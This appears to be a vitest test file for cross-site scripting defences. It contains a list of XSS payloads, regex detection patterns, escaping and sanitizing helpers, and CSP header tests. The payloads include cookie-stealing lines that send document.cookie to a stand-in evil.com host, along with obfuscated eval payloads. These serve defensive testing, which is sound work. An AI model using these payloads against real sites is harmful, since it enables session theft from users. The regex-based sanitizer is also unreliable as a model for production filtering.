/**
 * Cross-Site Scripting (XSS) Attack Tests
 *
 * Tests to verify XSS protection mechanisms.
 */

import { describe, it, expect } from 'vitest';

// Common XSS payloads for testing
const XSS_PAYLOADS = [
  '<script>alert("XSS")</script>',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '<body onload=alert("XSS")>',
  '<iframe src="javascript:alert(\'XSS\')">',
  '<a href="javascript:alert(\'XSS\')">Click</a>',
  '<div onmouseover="alert(\'XSS\')">Hover</div>',
  '<input onfocus=alert("XSS") autofocus>',
  '<marquee onstart=alert("XSS")>',
  '<video><source onerror="alert(\'XSS\')">',
  '<audio src=x onerror=alert("XSS")>',
  '<details open ontoggle=alert("XSS")>',
  '<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert(\'XSS\')">CLICKME</maction></math>',
  '<table background="javascript:alert(\'XSS\')">',
  '<object data="javascript:alert(\'XSS\')">',
  '<embed src="javascript:alert(\'XSS\')">',
  '<link rel="stylesheet" href="javascript:alert(\'XSS\')">',
  '"><script>alert("XSS")</script>',
  "'-alert('XSS')-'",
  '<img src="x" onerror="eval(atob(\'YWxlcnQoJ1hTUycp\'))">',
  '<svg/onload=alert("XSS")>',
  '<img src=x onerror=alert`XSS`>',
  '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>',
  '<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(&#39;XSS&#39;)">',
  '<script>alert(document.cookie)</script>',
  '<script>fetch("https://evil.com?cookie="+document.cookie)</script>',
  '<img src=x onerror="new Image().src=\'https://evil.com?cookie=\'+document.cookie">',
  '{{constructor.constructor("alert(1)")()}}',
  '${alert("XSS")}',
  '<style>@import "javascript:alert(\'XSS\')";</style>',
];

// XSS detection patterns
const XSS_PATTERNS = [
  /<script[\s\S]*?>[\s\S]*?<\/script>/gi,
  /<script[\s\S]*?>/gi,
  /javascript\s*:/gi,
  /on\w+\s*=/gi,
  /<iframe[\s\S]*?>/gi,
  /<object[\s\S]*?>/gi,
  /<embed[\s\S]*?>/gi,
  /<link[\s\S]*?>/gi,
  /<svg[\s\S]*?>/gi,
  /<math[\s\S]*?>/gi,
  /eval\s*\(/gi,
  /expression\s*\(/gi,
  /document\s*\.\s*cookie/gi,
  /document\s*\.\s*location/gi,
  /window\s*\.\s*location/gi,
  /innerHTML\s*=/gi,
  /outerHTML\s*=/gi,
  /document\s*\.\s*write/gi,
  /fromCharCode/gi,
  /atob\s*\(/gi,
  /btoa\s*\(/gi,
  /fetch\s*\(/gi,
  /XMLHttpRequest/gi,
  /constructor\s*\.\s*constructor/gi,
  /\${[\s\S]*?}/g,
  /{{[\s\S]*?}}/g,
];

function detectXss(input: string): { detected: boolean; patterns: string[] } {
  const matchedPatterns: string[] = [];

  for (const pattern of XSS_PATTERNS) {
    if (pattern.test(input)) {
      matchedPatterns.push(pattern.source);
      pattern.lastIndex = 0; // Reset for global patterns
    }
  }

  return {
    detected: matchedPatterns.length > 0,
    patterns: matchedPatterns,
  };
}

function escapeHtml(input: string): string {
  const htmlEntities: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
    '`': '&#x60;',
    '=': '&#x3D;',
  };

  return input.replace(/[&<>"'`=/]/g, (char) => htmlEntities[char] || char);
}

function sanitizeHtml(input: string): string {
  // Remove script tags and content
  let sanitized = input.replace(/<script[\s\S]*?>[\s\S]*?<\/script>/gi, '');

  // Remove event handlers
  sanitized = sanitized.replace(/\s*on\w+\s*=\s*["'][^"']*["']/gi, '');
  sanitized = sanitized.replace(/\s*on\w+\s*=[^\s>]*/gi, '');

  // Remove dangerous elements
  sanitized = sanitized.replace(/<(iframe|object|embed|link|style|meta)[^>]*>/gi, '');

  // Remove javascript: URLs
  sanitized = sanitized.replace(/javascript\s*:/gi, 'blocked:');

  // Remove data: URLs (can be used for XSS)
  sanitized = sanitized.replace(/data\s*:/gi, 'blocked:');

  return sanitized;
}

describe('XSS Detection', () => {
  describe('Script Tag Injection', () => {
    it('should detect basic script tags', () => {
      const result = detectXss('<script>alert("XSS")</script>');
      expect(result.detected).toBe(true);
    });

    it('should detect script tags with attributes', () => {
      const result = detectXss('<script type="text/javascript">alert(1)</script>');
      expect(result.detected).toBe(true);
    });

    it('should detect unclosed script tags', () => {
      const result = detectXss('<script>alert("XSS")');
      expect(result.detected).toBe(true);
    });
  });

  describe('Event Handler Injection', () => {
    it('should detect onerror handlers', () => {
      const result = detectXss('<img src=x onerror=alert("XSS")>');
      expect(result.detected).toBe(true);
    });

    it('should detect onload handlers', () => {
      const result = detectXss('<svg onload=alert("XSS")>');
      expect(result.detected).toBe(true);
    });

    it('should detect onmouseover handlers', () => {
      const result = detectXss('<div onmouseover="alert(\'XSS\')">Hover</div>');
      expect(result.detected).toBe(true);
    });

    it('should detect onfocus with autofocus', () => {
      const result = detectXss('<input onfocus=alert("XSS") autofocus>');
      expect(result.detected).toBe(true);
    });
  });

  describe('JavaScript URL Injection', () => {
    it('should detect javascript: URLs in href', () => {
      const result = detectXss('<a href="javascript:alert(\'XSS\')">Click</a>');
      expect(result.detected).toBe(true);
    });

    it('should detect javascript: URLs in src', () => {
      const result = detectXss('<iframe src="javascript:alert(\'XSS\')">');
      expect(result.detected).toBe(true);
    });
  });

  describe('Encoded Payloads', () => {
    it('should detect base64 encoded payloads using atob', () => {
      const result = detectXss('<img src="x" onerror="eval(atob(\'YWxlcnQoJ1hTUycp\'))">');
      expect(result.detected).toBe(true);
    });

    it('should detect charCode encoded payloads', () => {
      const result = detectXss(
        '<script>eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))</script>'
      );
      expect(result.detected).toBe(true);
    });
  });

  describe('Cookie Theft', () => {
    it('should detect document.cookie access', () => {
      const result = detectXss('<script>alert(document.cookie)</script>');
      expect(result.detected).toBe(true);
    });

    it('should detect cookie exfiltration via fetch', () => {
      const result = detectXss(
        '<script>fetch("https://evil.com?cookie="+document.cookie)</script>'
      );
      expect(result.detected).toBe(true);
    });

    it('should detect cookie exfiltration via Image', () => {
      const result = detectXss(
        '<img src=x onerror="new Image().src=\'https://evil.com?cookie=\'+document.cookie">'
      );
      expect(result.detected).toBe(true);
    });
  });

  describe('Template Injection', () => {
    it('should detect Angular-style template injection', () => {
      const result = detectXss('{{constructor.constructor("alert(1)")()}}');
      expect(result.detected).toBe(true);
    });

    it('should detect template literals', () => {
      const result = detectXss('${alert("XSS")}');
      expect(result.detected).toBe(true);
    });
  });

  describe('All Common Payloads', () => {
    it('should detect majority of common XSS payloads', () => {
      const undetected: string[] = [];

      for (const payload of XSS_PAYLOADS) {
        const result = detectXss(payload);
        if (!result.detected) {
          undetected.push(payload);
        }
      }

      const detectionRate = (XSS_PAYLOADS.length - undetected.length) / XSS_PAYLOADS.length;
      expect(detectionRate).toBeGreaterThan(0.85);
    });
  });

  describe('False Positives', () => {
    it('should not flag legitimate content', () => {
      const legitimateInputs = [
        'Hello, World!',
        'This is a paragraph about JavaScript.',
        'Contact us at support@example.com',
        'Price: $19.99',
        'The ratio is 1:2:3',
        'Click here for more info',
      ];

      for (const input of legitimateInputs) {
        const result = detectXss(input);
        expect(result.detected).toBe(false);
      }
    });
  });
});

describe('HTML Encoding', () => {
  it('should encode angle brackets', () => {
    const input = '<script>alert("XSS")</script>';
    const encoded = escapeHtml(input);
    expect(encoded).not.toContain('<');
    expect(encoded).not.toContain('>');
    expect(encoded).toContain('&lt;');
    expect(encoded).toContain('&gt;');
  });

  it('should encode quotes', () => {
    const input = '<img src="x" onerror="alert(\'XSS\')">';
    const encoded = escapeHtml(input);
    expect(encoded).toContain('&quot;');
    expect(encoded).toContain('&#x27;');
  });

  it('should encode ampersands', () => {
    const input = 'Tom & Jerry';
    const encoded = escapeHtml(input);
    expect(encoded).toBe('Tom &amp; Jerry');
  });

  it('should neutralize XSS payloads', () => {
    for (const payload of XSS_PAYLOADS.slice(0, 10)) {
      const encoded = escapeHtml(payload);
      // Verify no unencoded dangerous characters remain
      expect(encoded).not.toMatch(/<(?!&)/);
    }
  });
});

describe('HTML Sanitization', () => {
  it('should remove script tags', () => {
    const input = '<p>Hello</p><script>alert("XSS")</script><p>World</p>';
    const sanitized = sanitizeHtml(input);
    expect(sanitized).not.toContain('<script');
    expect(sanitized).not.toContain('</script');
    expect(sanitized).toContain('<p>Hello</p>');
    expect(sanitized).toContain('<p>World</p>');
  });

  it('should remove event handlers', () => {
    const input = '<img src="photo.jpg" onerror="alert(\'XSS\')" alt="Photo">';
    const sanitized = sanitizeHtml(input);
    expect(sanitized).not.toContain('onerror');
    expect(sanitized).toContain('src="photo.jpg"');
  });

  it('should remove iframe tags', () => {
    const input = '<iframe src="https://evil.com"></iframe>';
    const sanitized = sanitizeHtml(input);
    expect(sanitized).not.toContain('<iframe');
  });

  it('should block javascript: URLs', () => {
    const input = '<a href="javascript:alert(\'XSS\')">Click</a>';
    const sanitized = sanitizeHtml(input);
    expect(sanitized).not.toContain('javascript:');
    expect(sanitized).toContain('blocked:');
  });
});

describe('Context-Specific Escaping', () => {
  function escapeHtmlAttribute(value: string): string {
    return value
      .replace(/&/g, '&amp;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;');
  }

  function escapeJavaScript(value: string): string {
    return value
      .replace(/\\/g, '\\\\')
      .replace(/"/g, '\\"')
      .replace(/'/g, "\\'")
      .replace(/\n/g, '\\n')
      .replace(/\r/g, '\\r')
      .replace(/<\/script/gi, '<\\/script');
  }

  function escapeUrl(value: string): string {
    return encodeURIComponent(value);
  }

  function escapeCss(value: string): string {
    return value.replace(/[<>&"'\\]/g, (char) => `\\${char.charCodeAt(0).toString(16)} `);
  }

  it('should properly escape HTML attributes', () => {
    const maliciousValue = '" onclick="alert(\'XSS\')" data-x="';
    const escaped = escapeHtmlAttribute(maliciousValue);
    expect(escaped).not.toContain('"');
    expect(escaped).toContain('&quot;');
  });

  it('should properly escape JavaScript strings', () => {
    const maliciousValue = "'; alert('XSS'); //";
    const escaped = escapeJavaScript(maliciousValue);
    expect(escaped).toContain("\\'");
  });

  it('should properly escape URLs', () => {
    const maliciousValue = 'javascript:alert("XSS")';
    const escaped = escapeUrl(maliciousValue);
    expect(escaped).not.toContain(':');
  });

  it('should properly escape CSS', () => {
    const maliciousValue = 'expression(alert("XSS"))';
    const escaped = escapeCss(maliciousValue);
    expect(escaped).toContain('\\');
  });
});

describe('DOM-Based XSS Prevention', () => {
  it('should sanitize innerHTML assignments', () => {
    // Simulating DOM-based XSS detection
    const dangerousSinks = [
      'innerHTML',
      'outerHTML',
      'document.write',
      'document.writeln',
      'eval',
      'setTimeout with string',
      'setInterval with string',
    ];

    const code = `element.innerHTML = userInput;`;
    const hasDangerousSink = dangerousSinks.some((sink) => code.includes(sink));
    expect(hasDangerousSink).toBe(true);
  });

  it('should recommend textContent over innerHTML', () => {
    const safeCode = `element.textContent = userInput;`;
    const unsafeCode = `element.innerHTML = userInput;`;

    expect(safeCode).toContain('textContent');
    expect(unsafeCode).toContain('innerHTML');
  });
});

describe('Content Security Policy', () => {
  interface CSPConfig {
    defaultSrc: string[];
    scriptSrc: string[];
    styleSrc: string[];
    imgSrc: string[];
    connectSrc: string[];
    fontSrc: string[];
    objectSrc: string[];
    frameAncestors: string[];
    reportUri?: string;
  }

  function generateCSPHeader(config: CSPConfig): string {
    const directives: string[] = [];

    if (config.defaultSrc.length) {
      directives.push(`default-src ${config.defaultSrc.join(' ')}`);
    }
    if (config.scriptSrc.length) {
      directives.push(`script-src ${config.scriptSrc.join(' ')}`);
    }
    if (config.styleSrc.length) {
      directives.push(`style-src ${config.styleSrc.join(' ')}`);
    }
    if (config.imgSrc.length) {
      directives.push(`img-src ${config.imgSrc.join(' ')}`);
    }
    if (config.connectSrc.length) {
      directives.push(`connect-src ${config.connectSrc.join(' ')}`);
    }
    if (config.fontSrc.length) {
      directives.push(`font-src ${config.fontSrc.join(' ')}`);
    }
    if (config.objectSrc.length) {
      directives.push(`object-src ${config.objectSrc.join(' ')}`);
    }
    if (config.frameAncestors.length) {
      directives.push(`frame-ancestors ${config.frameAncestors.join(' ')}`);
    }
    if (config.reportUri) {
      directives.push(`report-uri ${config.reportUri}`);
    }

    return directives.join('; ');
  }

  it('should generate valid CSP header', () => {
    const config: CSPConfig = {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "'strict-dynamic'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", 'data:', 'https:'],
      connectSrc: ["'self'", 'https://api.example.com'],
      fontSrc: ["'self'", 'https://fonts.googleapis.com'],
      objectSrc: ["'none'"],
      frameAncestors: ["'none'"],
      reportUri: '/csp-report',
    };

    const header = generateCSPHeader(config);

    expect(header).toContain("default-src 'self'");
    expect(header).toContain("script-src 'self' 'strict-dynamic'");
    expect(header).toContain("object-src 'none'");
    expect(header).toContain("frame-ancestors 'none'");
  });

  it('should block inline scripts without nonce', () => {
    const config: CSPConfig = {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"],
      styleSrc: ["'self'"],
      imgSrc: ["'self'"],
      connectSrc: ["'self'"],
      fontSrc: ["'self'"],
      objectSrc: ["'none'"],
      frameAncestors: ["'self'"],
    };

    const header = generateCSPHeader(config);

    // No 'unsafe-inline' means inline scripts are blocked
    expect(header).not.toContain("'unsafe-inline'");
    expect(header).toContain("script-src 'self'");
  });
});
